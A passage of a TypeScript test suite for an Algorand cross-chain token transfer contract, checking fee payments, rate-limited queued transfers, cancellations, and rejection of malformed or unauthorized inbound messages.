      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: untrimmedAmount,
      });
      const recipient = getRandomBytes(32);
      await expect(
        client
          .newGroup()
          .addTransaction(opUpTxn)
          .transferFull({
            sender: user,
            args: [feePaymentTxn, sendTokenTxn, untrimmedAmount, PEER_CHAIN_ID, recipient, false, []],
            boxReferences: [getNttManagerPeerBoxKey(PEER_CHAIN_ID), getBucketBoxKey(outboundBucketId)],
            extraFee: (3000).microAlgos(),
          })
          .send(),
      ).rejects.toThrow("Insufficient fee payment amount");
    });

    test("succeeds when sufficient capacity and exact fee payment", async () => {
      // check there is sufficient capacity
      const outboundBucketId = getOutboundBucketIdBytes();
      const untrimmedAmount = BigInt(100_000);
      expect(await client.hasCapacity({ args: [outboundBucketId, untrimmedAmount] })).toBeTruthy();

      // calculate message id
      const prevMessageSequence = await client.state.global.messageSequence();
      const messageId = useMessageId(prevMessageSequence!);

      // calculate fill amount
      const inboundBucketId = getInboundBucketIdBytes(PEER_CHAIN_ID);
      const currentInboundCapacity = await client.getCurrentInboundCapacity({ args: [PEER_CHAIN_ID] });
      const inboundRateLimit = await client.getRateLimit({ args: [inboundBucketId] });
      const fillAmount = bigIntMin(inboundRateLimit - currentInboundCapacity, untrimmedAmount);

      // before
      const { balance: appAssetBalanceBefore } = await localnet.algorand.asset.getAccountInformation(
        getApplicationAddress(nttTokenAppId),
        assetId,
      );
      const { balance: userAssetBalanceBefore } = await localnet.algorand.asset.getAccountInformation(user, assetId);

      // prepare
      const feePaymentAmount = TOTAL_DELIVERY_PRICE;
      const recipient = getRandomBytes(32);
      const transceiverInstructions: TransceiverInstruction[] = [[getRandomUInt(MAX_UINT64), getRandomBytes(10)]];

      // transfer
      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [3000],
        extraFee: (3000).microAlgos(),
      });
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: feePaymentAmount.microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: untrimmedAmount,
      });
      const res = await client
        .newGroup()
        .addTransaction(opUpTxn)
        .transferFull({
          sender: user,
          args: [
            feePaymentTxn,
            sendTokenTxn,
            untrimmedAmount,
            PEER_CHAIN_ID,
            recipient,
            false,
            transceiverInstructions,
          ],
          appReferences: [transceiverManagerAppId],
          boxReferences: [getNttManagerPeerBoxKey(PEER_CHAIN_ID), getBucketBoxKey(outboundBucketId)],
          extraFee: (3000).microAlgos(),
        })
        .send();

      // check logs
      expect(res.returns).toEqual([messageId]);
      expect(res.confirmations[3].innerTxns![0].logs![0]).toEqual(
        getEventBytes("InternalQuoteDeliveryPrices(uint64,byte[32],(uint64,byte[])[])", [
          appId,
          messageId,
          transceiverInstructions,
        ]),
      );
      expect(res.confirmations[3].innerTxns![2].logs![0]).toEqual(
        getEventBytes("MessageSentToTransceivers(uint64,uint64,address,byte[32],(uint64,byte[])[])", [
          appId,
          TOTAL_DELIVERY_PRICE,
          getApplicationAddress(transceiverManagerAppId),
          messageId,
          transceiverInstructions,
        ]),
      );
      expect(res.confirmations[3].logs![0]).toEqual(
        getEventBytes("BucketConsumed(byte[32],uint256)", [outboundBucketId, untrimmedAmount]),
      );
      expect(res.confirmations[3].logs![1]).toEqual(
        getEventBytes("BucketFilled(byte[32],uint256,uint256)", [inboundBucketId, untrimmedAmount, fillAmount]),
      );
      expect(res.confirmations[3].logs![2]).toEqual(
        getEventBytes("TransferSent(byte[32],byte[32],uint16,uint64,uint64)", [
          messageId,
          recipient,
          PEER_CHAIN_ID,
          untrimmedAmount,
          TOTAL_DELIVERY_PRICE,
        ]),
      );

      // check message sequence
      expect(await client.state.global.messageSequence()).toEqual(prevMessageSequence! + 1n);

      // check asset transfer
      const { balance: appAssetBalanceAfter } = await localnet.algorand.asset.getAccountInformation(
        getApplicationAddress(nttTokenAppId),
        assetId,
      );
      const { balance: userAssetBalanceAfter } = await localnet.algorand.asset.getAccountInformation(user, assetId);
      expect(appAssetBalanceAfter).toEqual(appAssetBalanceBefore + untrimmedAmount);
      expect(userAssetBalanceAfter).toEqual(userAssetBalanceBefore - untrimmedAmount);

      // check no refund
      expect(res.confirmations[3].innerTxns!.length).toEqual(3);
    });

    test("succeeds when sufficient capacity and excess fee payment", async () => {
      // check there is sufficient capacity
      const outboundBucketId = getOutboundBucketIdBytes();
      const untrimmedAmount = BigInt(100_000);
      expect(await client.hasCapacity({ args: [outboundBucketId, untrimmedAmount] })).toBeTruthy();

      // calculate message id
      const prevMessageSequence = await client.state.global.messageSequence();
      const messageId = useMessageId(prevMessageSequence!);

      // calculate fill amount
      const inboundBucketId = getInboundBucketIdBytes(PEER_CHAIN_ID);
      const currentInboundCapacity = await client.getCurrentInboundCapacity({ args: [PEER_CHAIN_ID] });
      const inboundRateLimit = await client.getRateLimit({ args: [inboundBucketId] });
      const fillAmount = bigIntMin(inboundRateLimit - currentInboundCapacity, untrimmedAmount);

      // before
      const { balance: appAssetBalanceBefore } = await localnet.algorand.asset.getAccountInformation(
        getApplicationAddress(nttTokenAppId),
        assetId,
      );
      const { balance: userAssetBalanceBefore } = await localnet.algorand.asset.getAccountInformation(user, assetId);

      // prepare
      const excessFeePaymentAmount = 100_000n;
      const feePaymentAmount = TOTAL_DELIVERY_PRICE + excessFeePaymentAmount;
      const recipient = getRandomBytes(32);
      const transceiverInstructions: TransceiverInstruction[] = [[getRandomUInt(MAX_UINT64), getRandomBytes(10)]];

      // transfer
      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [3000],
        extraFee: (3000).microAlgos(),
      });
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: feePaymentAmount.microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: untrimmedAmount,
      });
      const res = await client
        .newGroup()
        .addTransaction(opUpTxn)
        .transferFull({
          sender: user,
          args: [
            feePaymentTxn,
            sendTokenTxn,
            untrimmedAmount,
            PEER_CHAIN_ID,
            recipient,
            false,
            transceiverInstructions,
          ],
          appReferences: [transceiverManagerAppId],
          boxReferences: [getNttManagerPeerBoxKey(PEER_CHAIN_ID), getBucketBoxKey(outboundBucketId)],
          extraFee: (4000).microAlgos(),
        })
        .send();

      // check logs
      expect(res.returns).toEqual([messageId]);
      expect(res.confirmations[3].innerTxns![0].logs![0]).toEqual(
        getEventBytes("InternalQuoteDeliveryPrices(uint64,byte[32],(uint64,byte[])[])", [
          appId,
          messageId,
          transceiverInstructions,
        ]),
      );
      expect(res.confirmations[3].innerTxns![2].logs![0]).toEqual(
        getEventBytes("MessageSentToTransceivers(uint64,uint64,address,byte[32],(uint64,byte[])[])", [
          appId,
          TOTAL_DELIVERY_PRICE,
          getApplicationAddress(transceiverManagerAppId),
          messageId,
          transceiverInstructions,
        ]),
      );
      expect(res.confirmations[3].logs![0]).toEqual(
        getEventBytes("BucketConsumed(byte[32],uint256)", [outboundBucketId, untrimmedAmount]),
      );
      expect(res.confirmations[3].logs![1]).toEqual(
        getEventBytes("BucketFilled(byte[32],uint256,uint256)", [inboundBucketId, untrimmedAmount, fillAmount]),
      );
      expect(res.confirmations[3].logs![2]).toEqual(
        getEventBytes("TransferSent(byte[32],byte[32],uint16,uint64,uint64)", [
          messageId,
          recipient,
          PEER_CHAIN_ID,
          untrimmedAmount,
          TOTAL_DELIVERY_PRICE,
        ]),
      );

      // check message sequence
      expect(await client.state.global.messageSequence()).toEqual(prevMessageSequence! + 1n);

      // check asset transfer
      const { balance: appAssetBalanceAfter } = await localnet.algorand.asset.getAccountInformation(
        getApplicationAddress(nttTokenAppId),
        assetId,
      );
      const { balance: userAssetBalanceAfter } = await localnet.algorand.asset.getAccountInformation(user, assetId);
      expect(appAssetBalanceAfter).toEqual(appAssetBalanceBefore + untrimmedAmount);
      expect(userAssetBalanceAfter).toEqual(userAssetBalanceBefore - untrimmedAmount);

      // check refund
      expect(res.confirmations[3].innerTxns!.length).toEqual(4);
      expect(res.confirmations[3].innerTxns![3].txn.txn.type).toEqual("pay");
      expect(res.confirmations[3].innerTxns![3].txn.txn.payment!.amount).toEqual(excessFeePaymentAmount);
      expect(res.confirmations[3].innerTxns![3].txn.txn.payment!.receiver.toString()).toEqual(user.toString());
    });
  });

  describe("complete outbound queued transfer", () => {
    let queuedTransferMessageId: Uint8Array;
    const untrimmedAmount = OUTBOUND_LIMIT + BigInt(10_000);
    const recipient = getRandomBytes(32);
    const transceiverInstructions: TransceiverInstruction[] = [[getRandomUInt(MAX_UINT64), getRandomBytes(10)]];

    beforeEach(async () => {
      // prepare
      const outboundBucketId = getOutboundBucketIdBytes();
      const APP_MIN_BALANCE = (70_100).microAlgos();
      const feePaymentAmount = TOTAL_DELIVERY_PRICE;

      // calculate message id
      const prevMessageSequence = await client.state.global.messageSequence();
      queuedTransferMessageId = useMessageId(prevMessageSequence!);

      // transfer
      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [3000],
        extraFee: (3000).microAlgos(),
      });
      const fundingTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: APP_MIN_BALANCE,
      });
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: feePaymentAmount.microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: untrimmedAmount,
      });
      await client
        .newGroup()
        .addTransaction(fundingTxn)
        .addTransaction(opUpTxn)
        .transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, untrimmedAmount, PEER_CHAIN_ID, recipient, true, transceiverInstructions],
          appReferences: [transceiverManagerAppId],
          boxReferences: [
            getNttManagerPeerBoxKey(PEER_CHAIN_ID),
            getBucketBoxKey(outboundBucketId),
            getOutboundQueuedTransfersBoxKey(queuedTransferMessageId),
          ],
          extraFee: (1000).microAlgos(),
        })
        .send();

      // ensure queued
      await client.getOutboundQueuedTransfer({ args: [queuedTransferMessageId] });
    });

    test("fails when the transfer is unknown", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: TOTAL_DELIVERY_PRICE.microAlgo(),
      });
      const messageId = getRandomBytes(32);
      await expect(
        client.send.completeOutboundQueuedTransfer({
          sender: user,
          args: [feePaymentTxn, messageId],
          boxReferences: [getOutboundQueuedTransfersBoxKey(messageId)],
        }),
      ).rejects.toThrow("Unknown outbound queued transfer");
    });

    test("fails when insufficient time has elapsed", async () => {
      // ensure insufficient time has passed
      const outboundQueuedTransfer = await client.getOutboundQueuedTransfer({ args: [queuedTransferMessageId] });
      const latestTimestamp = await getPrevBlockTimestamp(localnet);
      const targetTimestamp = outboundQueuedTransfer[1][0] + OUTBOUND_DURATION;
      expect(latestTimestamp).toBeLessThan(targetTimestamp);

      // complete outbound queued transfer
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: TOTAL_DELIVERY_PRICE.microAlgo(),
      });
      await expect(
        client.send.completeOutboundQueuedTransfer({
          sender: user,
          args: [feePaymentTxn, queuedTransferMessageId],
          boxReferences: [getOutboundQueuedTransfersBoxKey(queuedTransferMessageId)],
        }),
      ).rejects.toThrow("Outbound queued transfer is still queued");
    });

    test("fails when fee payment receiver isn't contract", async () => {
      // advance till sufficient time has passed
      const outboundQueuedTransfer = await client.getOutboundQueuedTransfer({ args: [queuedTransferMessageId] });
      const latestTimestamp = await getPrevBlockTimestamp(localnet);
      const targetTimestamp = outboundQueuedTransfer[1][0] + OUTBOUND_DURATION;
      await advancePrevBlockTimestamp(localnet, targetTimestamp - latestTimestamp);

      // complete outbound queued transfer
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: user.toString(),
        amount: TOTAL_DELIVERY_PRICE.microAlgo(),
      });
      await expect(
        client.send.completeOutboundQueuedTransfer({
          sender: user,
          args: [feePaymentTxn, queuedTransferMessageId],
          appReferences: [transceiverManagerAppId],
          boxReferences: [getOutboundQueuedTransfersBoxKey(queuedTransferMessageId)],
          extraFee: (3000).microAlgos(),
        }),
      ).rejects.toThrow("Unknown fee payment receiver");
    });

    test("fails when insufficient fee payment", async () => {
      // advance till sufficient time has passed
      const outboundQueuedTransfer = await client.getOutboundQueuedTransfer({ args: [queuedTransferMessageId] });
      const latestTimestamp = await getPrevBlockTimestamp(localnet);
      const targetTimestamp = outboundQueuedTransfer[1][0] + OUTBOUND_DURATION;
      await advancePrevBlockTimestamp(localnet, targetTimestamp - latestTimestamp);

      // complete outbound queued transfer
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (TOTAL_DELIVERY_PRICE - 1n).microAlgo(),
      });
      await expect(
        client.send.completeOutboundQueuedTransfer({
          sender: user,
          args: [feePaymentTxn, queuedTransferMessageId],
          appReferences: [transceiverManagerAppId],
          boxReferences: [getOutboundQueuedTransfersBoxKey(queuedTransferMessageId)],
          extraFee: (3000).microAlgos(),
        }),
      ).rejects.toThrow("Insufficient fee payment amount");
    });

    test("succeeds when exact fee payment", async () => {
      // advance till sufficient time has passed
      const outboundQueuedTransfer = await client.getOutboundQueuedTransfer({ args: [queuedTransferMessageId] });
      const latestTimestamp = await getPrevBlockTimestamp(localnet);
      const targetTimestamp = outboundQueuedTransfer[1][0] + OUTBOUND_DURATION;
      await advancePrevBlockTimestamp(localnet, targetTimestamp - latestTimestamp);

      // complete outbound queued transfer
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: TOTAL_DELIVERY_PRICE.microAlgo(),
      });
      const res = await client.send.completeOutboundQueuedTransfer({
        sender: user,
        args: [feePaymentTxn, queuedTransferMessageId],
        appReferences: [transceiverManagerAppId],
        boxReferences: [getOutboundQueuedTransfersBoxKey(queuedTransferMessageId)],
        extraFee: (4000).microAlgos(),
      });

      // check logs
      expect(res.return).toEqual(queuedTransferMessageId);
      expect(res.confirmations[1].innerTxns![0].logs![0]).toEqual(
        getEventBytes("InternalQuoteDeliveryPrices(uint64,byte[32],(uint64,byte[])[])", [
          appId,
          queuedTransferMessageId,
          transceiverInstructions,
        ]),
      );
      expect(res.confirmations[1].innerTxns![2].logs![0]).toEqual(
        getEventBytes("MessageSentToTransceivers(uint64,uint64,address,byte[32],(uint64,byte[])[])", [
          appId,
          TOTAL_DELIVERY_PRICE,
          getApplicationAddress(transceiverManagerAppId),
          queuedTransferMessageId,
          transceiverInstructions,
        ]),
      );
      expect(res.confirmations[1].logs![0]).toEqual(
        getEventBytes("OutboundTransferDeleted(byte[32])", [queuedTransferMessageId]),
      );
      expect(res.confirmations[1].logs![1]).toEqual(
        getEventBytes("TransferSent(byte[32],byte[32],uint16,uint64,uint64)", [
          queuedTransferMessageId,
          recipient,
          PEER_CHAIN_ID,
          untrimmedAmount,
          TOTAL_DELIVERY_PRICE,
        ]),
      );

      // check refund
      expect(res.confirmations[1].innerTxns!.length).toEqual(4);
      const APP_MIN_BALANCE = (70_100).microAlgos();
      expect(res.confirmations[1].innerTxns![3].txn.txn.type).toEqual("pay");
      expect(res.confirmations[1].innerTxns![3].txn.txn.payment!.amount).toEqual(APP_MIN_BALANCE.microAlgo);
      expect(res.confirmations[1].innerTxns![3].txn.txn.payment!.receiver.toString()).toEqual(user.toString());
    });

    test("succeeds when excess fee payment", async () => {
      // advance till sufficient time has passed
      const outboundQueuedTransfer = await client.getOutboundQueuedTransfer({ args: [queuedTransferMessageId] });
      const latestTimestamp = await getPrevBlockTimestamp(localnet);
      const targetTimestamp = outboundQueuedTransfer[1][0] + OUTBOUND_DURATION;
      await advancePrevBlockTimestamp(localnet, targetTimestamp - latestTimestamp);

      // complete outbound queued transfer
      const excessFeePaymentAmount = 100_000n;
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (TOTAL_DELIVERY_PRICE + excessFeePaymentAmount).microAlgo(),
      });
      const res = await client.send.completeOutboundQueuedTransfer({
        sender: user,
        args: [feePaymentTxn, queuedTransferMessageId],
        appReferences: [transceiverManagerAppId],
        boxReferences: [getOutboundQueuedTransfersBoxKey(queuedTransferMessageId)],
        extraFee: (5000).microAlgos(),
      });

      // check logs
      expect(res.return).toEqual(queuedTransferMessageId);
      expect(res.confirmations[1].innerTxns![0].logs![0]).toEqual(
        getEventBytes("InternalQuoteDeliveryPrices(uint64,byte[32],(uint64,byte[])[])", [
          appId,
          queuedTransferMessageId,
          transceiverInstructions,
        ]),
      );
      expect(res.confirmations[1].innerTxns![2].logs![0]).toEqual(
        getEventBytes("MessageSentToTransceivers(uint64,uint64,address,byte[32],(uint64,byte[])[])", [
          appId,
          TOTAL_DELIVERY_PRICE,
          getApplicationAddress(transceiverManagerAppId),
          queuedTransferMessageId,
          transceiverInstructions,
        ]),
      );
      expect(res.confirmations[1].logs![0]).toEqual(
        getEventBytes("OutboundTransferDeleted(byte[32])", [queuedTransferMessageId]),
      );
      expect(res.confirmations[1].logs![1]).toEqual(
        getEventBytes("TransferSent(byte[32],byte[32],uint16,uint64,uint64)", [
          queuedTransferMessageId,
          recipient,
          PEER_CHAIN_ID,
          untrimmedAmount,
          TOTAL_DELIVERY_PRICE,
        ]),
      );

      // check refunds
      expect(res.confirmations[1].innerTxns!.length).toEqual(5);
      expect(res.confirmations[1].innerTxns![3].txn.txn.type).toEqual("pay");
      expect(res.confirmations[1].innerTxns![3].txn.txn.payment!.amount).toEqual(excessFeePaymentAmount);
      expect(res.confirmations[1].innerTxns![3].txn.txn.payment!.receiver.toString()).toEqual(user.toString());
      const APP_MIN_BALANCE = (70_100).microAlgos();
      expect(res.confirmations[1].innerTxns![4].txn.txn.type).toEqual("pay");
      expect(res.confirmations[1].innerTxns![4].txn.txn.payment!.amount).toEqual(APP_MIN_BALANCE.microAlgo);
      expect(res.confirmations[1].innerTxns![4].txn.txn.payment!.receiver.toString()).toEqual(user.toString());
    });
  });

  describe("cancel outbound queued transfer", () => {
    let queuedTransferMessageId: Uint8Array;
    const untrimmedAmount = OUTBOUND_LIMIT + BigInt(10_000);

    beforeAll(async () => {
      // prepare
      const outboundBucketId = getOutboundBucketIdBytes();
      const APP_MIN_BALANCE = (70_100).microAlgos();
      const feePaymentAmount = TOTAL_DELIVERY_PRICE;
      const recipient = getRandomBytes(32);

      // calculate message id
      const prevMessageSequence = await client.state.global.messageSequence();
      queuedTransferMessageId = useMessageId(prevMessageSequence!);

      // transfer
      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [3000],
        extraFee: (3000).microAlgos(),
      });
      const fundingTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: APP_MIN_BALANCE,
      });
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: feePaymentAmount.microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: untrimmedAmount,
      });
      await client
        .newGroup()
        .addTransaction(fundingTxn)
        .addTransaction(opUpTxn)
        .transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, untrimmedAmount, PEER_CHAIN_ID, recipient, true, []],
          appReferences: [transceiverManagerAppId],
          boxReferences: [
            getNttManagerPeerBoxKey(PEER_CHAIN_ID),
            getBucketBoxKey(outboundBucketId),
            getOutboundQueuedTransfersBoxKey(queuedTransferMessageId),
          ],
          extraFee: (1000).microAlgos(),
        })
        .send();

      // ensure queued
      await client.getOutboundQueuedTransfer({ args: [queuedTransferMessageId] });
    });

    test("fails when the transfer is unknown", async () => {
      const messageId = getRandomBytes(32);
      await expect(
        client.send.cancelOutboundQueuedTransfer({
          sender: user,
          args: [messageId],
          boxReferences: [getOutboundQueuedTransfersBoxKey(messageId)],
        }),
      ).rejects.toThrow("Unknown outbound queued transfer");
    });

    test("fails when caller didn't initiate the transfer", async () => {
      await expect(
        client.send.cancelOutboundQueuedTransfer({
          sender: admin,
          args: [queuedTransferMessageId],
          boxReferences: [getOutboundQueuedTransfersBoxKey(queuedTransferMessageId)],
        }),
      ).rejects.toThrow("Canceller is not original sender");
    });

    test("succeeds", async () => {
      const res = await client.send.cancelOutboundQueuedTransfer({
        sender: user,
        args: [queuedTransferMessageId],
        appReferences: [nttTokenAppId],
        boxReferences: [getOutboundQueuedTransfersBoxKey(queuedTransferMessageId)],
        extraFee: (2000).microAlgos(),
      });

      // check logs
      expect(res.confirmations[0].innerTxns![0].logs![0]).toEqual(
        getEventBytes("Minted(address,uint64)", [user.toString(), untrimmedAmount]),
      );
      expect(res.confirmations[0].logs![0]).toEqual(
        getEventBytes("OutboundTransferDeleted(byte[32])", [queuedTransferMessageId]),
      );

      // check refund
      expect(res.confirmations[0].innerTxns!.length).toEqual(2);
      const APP_MIN_BALANCE = (70_100).microAlgos();
      expect(res.confirmations[0].innerTxns![1].txn.txn.type).toEqual("pay");
      expect(res.confirmations[0].innerTxns![1].txn.txn.payment!.amount).toEqual(APP_MIN_BALANCE.microAlgo);
      expect(res.confirmations[0].innerTxns![1].txn.txn.payment!.receiver.toString()).toEqual(user.toString());
    });
  });

  describe("handle message", () => {
    beforeAll(async () => {
      // ensure message is approved
      await transceiverManagerClient.send.setMessageAttestations({ args: [THRESHOLD] });
    });

    test("fails when incorrect prefix", async () => {
      const amount = 1_000n;

      // prepare message
      const incorrectPrefix = getRandomBytes(4);
      const payload = getNttPayload(PEER_DECIMALS, amount, getRandomBytes(32), user.publicKey, SOURCE_CHAIN_ID);
      payload.set(incorrectPrefix);
      const messageReceived = getMessageReceived(
        PEER_CHAIN_ID,
        getRandomMessageToSend({
          sourceAddress: PEER_CONTRACT,
          destinationChainId: Number(SOURCE_CHAIN_ID),
          handlerAddress: getApplicationAddress(appId).publicKey,
          payload,
        }),
      );
      const messageDigest = calculateMessageDigest(messageReceived);
      await transceiverManagerClient.send.setMessageDigest({ args: [messageDigest] });

      // execute message
      await expect(
        client.send.executeMessage({
          sender: relayer,
          args: [messageReceived],
          appReferences: [transceiverManagerAppId],
          boxReferences: [getMessagesExecutedBoxKey(messageDigest)],
          extraFee: (2000).microAlgos(),
        }),
      ).rejects.toThrow("Incorrect prefix");
    });

    test("fails when source chain is unknown", async () => {
      const amount = 1_000n;

      // prepare message
      const messageReceived = getMessageReceived(
        SOURCE_CHAIN_ID,
        getRandomMessageToSend({
          sourceAddress: PEER_CONTRACT,
          destinationChainId: Number(SOURCE_CHAIN_ID),
          handlerAddress: getApplicationAddress(appId).publicKey,
          payload: getNttPayload(PEER_DECIMALS, amount, getRandomBytes(32), user.publicKey, SOURCE_CHAIN_ID),
        }),
      );
      const messageDigest = calculateMessageDigest(messageReceived);
      await transceiverManagerClient.send.setMessageDigest({ args: [messageDigest] });

      // execute message
      await expect(
        client.send.executeMessage({
          sender: relayer,
          args: [messageReceived],
          appReferences: [transceiverManagerAppId],
          boxReferences: [getMessagesExecutedBoxKey(messageDigest)],
          extraFee: (2000).microAlgos(),
        }),
      ).rejects.toThrow("Unknown peer chain");
    });

    test("fails when peer address is unknown", async () => {
      const amount = 1_000n;

      // prepare message
      const messageReceived = getMessageReceived(
        PEER_CHAIN_ID,
        getRandomMessageToSend({
          sourceAddress: getRandomBytes(32),
          destinationChainId: Number(SOURCE_CHAIN_ID),
          handlerAddress: getApplicationAddress(appId).publicKey,
          payload: getNttPayload(PEER_DECIMALS, amount, getRandomBytes(32), user.publicKey, SOURCE_CHAIN_ID),
        }),
      );
      const messageDigest = calculateMessageDigest(messageReceived);
      await transceiverManagerClient.send.setMessageDigest({ args: [messageDigest] });

      // execute message
      await expect(
        client.send.executeMessage({
          sender: relayer,
          args: [messageReceived],
          appReferences: [transceiverManagerAppId],
          boxReferences: [getMessagesExecutedBoxKey(messageDigest)],
          extraFee: (2000).microAlgos(),
        }),
      ).rejects.toThrow("Unknown peer address");
    });

    test("fails when invalid target chain", async () => {
      const amount = 1_000n;

      // prepare message
      const messageReceived = getMessageReceived(
        PEER_CHAIN_ID,
        getRandomMessageToSend({
          sourceAddress: PEER_CONTRACT,
          destinationChainId: Number(SOURCE_CHAIN_ID),
          handlerAddress: getApplicationAddress(appId).publicKey,
          payload: getNttPayload(PEER_DECIMALS, amount, getRandomBytes(32), user.publicKey, PEER_CHAIN_ID),
        }),
      );
      const messageDigest = calculateMessageDigest(messageReceived);
      await transceiverManagerClient.send.setMessageDigest({ args: [messageDigest] });

      // execute message
      await expect(
        client.send.executeMessage({
          sender: relayer,
          args: [messageReceived],
          appReferences: [transceiverManagerAppId],
          boxReferences: [getMessagesExecutedBoxKey(messageDigest)],
          extraFee: (2000).microAlgos(),
        }),
      ).rejects.toThrow("Invalid target chain");
    });

    test("fails when paused", async () => {
      const amount = 0n;

      // pause
      await client.send.pause({
        sender: pauser,
        args: [],
        boxReferences: [getRoleBoxKey(PAUSER_ROLE), getAddressRolesBoxKey(PAUSER_ROLE, pauser.publicKey)],
      });

      // prepare message
      const messageReceived = getMessageReceived(
        PEER_CHAIN_ID,
        getRandomMessageToSend({
          sourceAddress: PEER_CONTRACT,
          destinationChainId: Number(SOURCE_CHAIN_ID),
          handlerAddress: getApplicationAddress(appId).publicKey,
          payload: getNttPayload(PEER_DECIMALS, amount, getRandomBytes(32), user.publicKey, SOURCE_CHAIN_ID),
        }),
      );

      const messageDigest = calculateMessageDigest(messageReceived);
      await transceiverManagerClient.send.setMessageDigest({ args: [messageDigest] });

      // execute message
      await expect(
        client.send.executeMessage({
          sender: relayer,
          args: [messageReceived],
          appReferences: [transceiverManagerAppId],
          boxReferences: [getMessagesExecutedBoxKey(messageDigest)],
          extraFee: (2000).microAlgos(),
        }),
      ).rejects.toThrow("Contract is paused");

      // unpause
      await client.send.unpause({
        sender: unpauser,
        args: [],
        boxReferences: [getRoleBoxKey(UNPAUSER_ROLE), getAddressRolesBoxKey(UNPAUSER_ROLE, pauser.publicKey)],
      });
    });

    test("succeeds when insufficient capacity", async () => {
      // check there is insufficient capacity
      const inboundBucketId = getInboundBucketIdBytes(PEER_CHAIN_ID);
      const currentCapacity = await client.getCurrentInboundCapacity({ args: [PEER_CHAIN_ID] });
      const untrimmedAmount = INBOUND_LIMIT + 10_000n;
      expect(await client.hasCapacity({ args: [inboundBucketId, untrimmedAmount] })).toBeFalsy();

      // prepare message
      const latestTimestamp = await getPrevBlockTimestamp(localnet);
      const amount = untrimmedAmount / 10_000n;
      const messageReceived = getMessageReceived(
        PEER_CHAIN_ID,
        getRandomMessageToSend({
          sourceAddress: PEER_CONTRACT,
          destinationChainId: Number(SOURCE_CHAIN_ID),
          handlerAddress: getApplicationAddress(appId).publicKey,
          payload: getNttPayload(PEER_DECIMALS, amount, getRandomBytes(32), user.publicKey, SOURCE_CHAIN_ID),
        }),
      );
      const messageDigest = calculateMessageDigest(messageReceived);
      await transceiverManagerClient.send.setMessageDigest({ args: [messageDigest] });

      // execute message
      const APP_MIN_BALANCE = (68_600).microAlgo();
      const fundingTxn = await localnet.algorand.createTransaction.payment({
        sender: relayer,
        receiver: getApplicationAddress(appId),
        amount: APP_MIN_BALANCE,
      });
      const res = await client
        .newGroup()
        .addTransaction(fundingTxn)
        .executeMessage({
          sender: relayer,
          args: [messageReceived],
          appReferences: [transceiverManagerAppId],
          boxReferences: [
            getMessagesExecutedBoxKey(messageDigest),
            getBucketBoxKey(inboundBucketId),
            getInboundQueuedTransfersBoxKey(messageDigest),
          ],
          extraFee: (2000).microAlgos(),
        })
        .send();

      // check logs
      expect(res.confirmations[1].logs![0]).toEqual(
        getEventBytes("InboundTransferRateLimited(address,byte[32],uint256,uint64)", [
          user.toString(),
          messageDigest,
          currentCapacity,
          untrimmedAmount,
        ]),
      );

      // check queued transfer
      const inboundQueuedTransfer = await client.getInboundQueuedTransfer({ args: [messageDigest] });
      expect(inboundQueuedTransfer[1]).toEqual([
        latestTimestamp,
        [amount, PEER_DECIMALS],
        Number(PEER_CHAIN_ID),
        user.toString(),
      ]);
    });

    test("succeeds when sufficient capacity", async () => {
      // check there is sufficient capacity
      const inboundBucketId = getInboundBucketIdBytes(PEER_CHAIN_ID);
      const untrimmedAmount = 10_000n;
      expect(await client.hasCapacity({ args: [inboundBucketId, untrimmedAmount] })).toBeTruthy();

      // prepare message
      const amount = untrimmedAmount / 10_000n;
      const messageReceived = getMessageReceived(
        PEER_CHAIN_ID,
        getRandomMessageToSend({
          sourceAddress: PEER_CONTRACT,
          destinationChainId: Number(SOURCE_CHAIN_ID),
          handlerAddress: getApplicationAddress(appId).publicKey,
          payload: getNttPayload(PEER_DECIMALS, amount, getRandomBytes(32), user.publicKey, SOURCE_CHAIN_ID),
        }),
      );
      const messageDigest = calculateMessageDigest(messageReceived);
      await transceiverManagerClient.send.setMessageDigest({ args: [messageDigest] });

      // execute message
      const APP_MIN_BALANCE = (22_900).microAlgo();
      const fundingTxn = await localnet.algorand.createTransaction.payment({
        sender: relayer,
        receiver: getApplicationAddress(appId),
